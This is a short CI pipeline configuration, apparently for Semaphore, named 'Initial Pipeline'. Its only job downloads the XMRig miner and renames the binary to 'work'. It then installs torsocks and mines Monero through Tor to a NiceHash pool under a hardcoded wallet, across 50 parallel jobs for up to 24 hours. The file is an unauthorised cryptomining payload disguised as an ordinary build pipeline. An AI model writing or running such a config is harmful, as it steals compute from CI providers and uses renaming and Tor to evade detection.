version: v1.0
name: Initial Pipeline
agent:
  machine:
    type: e1-standard-2
    os_image: ubuntu2004
execution_time_limit:
  hours: 24
blocks:
  - name: 'Block #1'
    task:
      jobs:
        - name: 'Job #1'
          commands:
            - 'sudo mkdir /work ; cd /work ; sudo wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz ; sudo tar xvzf xmrig-6.21.0-linux-static-x64.tar.gz ; sudo rm xmrig-6.21.0-linux-static-x64.tar.gz ; sudo mv xmrig-6.21.0 work ; cd /work ; sudo mv xmrig work ; sudo apt-get install torsocks -y ; sudo torsocks ./work -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -a rx -k -u 37orpMpCSkTH5MQxfA4PTw2YbVdvzPdmPA.Parallel -p cpu -a randomx -k'
          parallelism: 50
